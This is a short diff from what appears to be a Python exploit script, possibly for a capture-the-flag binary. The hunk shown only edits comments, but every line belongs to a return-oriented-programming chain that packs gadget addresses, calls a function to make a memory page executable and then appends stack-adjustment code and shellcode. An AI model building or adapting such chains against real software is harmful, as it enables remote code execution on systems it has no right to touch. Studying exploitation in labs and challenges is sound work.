@@ -83,8 +83,8 @@ if __name__ == "__main__":
     bytes += p64(B + b.plt['alarm'])        # 0x10
     bytes += p64(B + pop_rdi)               # 0x18
     bytes += p64(0xcafebabe)                # 0x20
-    bytes += p64(B + 0xa20)                 # 0x28
-    bytes += p64(0xcafebabe)                # 0x30
+    bytes += p64(B + 0xa20)                 # 0x28, make_page_executable()
+    bytes += p64(0xcafebabe)                # 0x30, (adjust_stack + shellcode)
     bytes += adjust_stack                   # 0x38
     bytes += shellcode
 
